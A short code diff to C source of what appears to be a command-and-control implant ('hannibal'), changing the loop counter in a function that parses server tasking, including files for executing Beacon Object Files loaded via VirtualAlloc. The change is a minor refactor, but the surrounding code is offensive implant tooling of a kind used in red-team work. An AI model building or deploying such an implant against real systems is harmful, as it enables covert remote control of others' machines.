@@ -553,7 +553,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
         LPVOID param3_lpvoid;   
         LPVOID temp1_lpvoid;
         LPVOID temp2_lpvoid;
-        
+        UINT32 temp1_uint32;
         UINT32 params_array[255];
 
 #ifdef INCLUDE_CMD_LS
@@ -1189,7 +1189,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
                 
                 file_args->number_of_files = ReadUint32(&buffer);
                 
-                for (int i = 0; i < file_args->number_of_files; i++) {
+                for (temp1_uint32 = 0; temp1_uint32 < file_args->number_of_files; temp1_uint32++) {
                     tlv_type = ReadUint8(&buffer);
                     if (tlv_type == TLV_CMD_EXECUTE_BOF_NEXT_FILE) {
                         // temp1_lpvoid is the head of the linked list.
@@ -1198,7 +1198,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
                         // allocate new FILE_CONTENT struct
                         temp2_lpvoid = (PFILE_CONTENT *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(FILE_CONTENT), MEM_COMMIT, PAGE_READWRITE);
 
-                        if (i == 0) {
+                        if (temp1_uint32 == 0) {
                             // this is the first file.
                             file_args->file_content = temp2_lpvoid;                
                         } else {
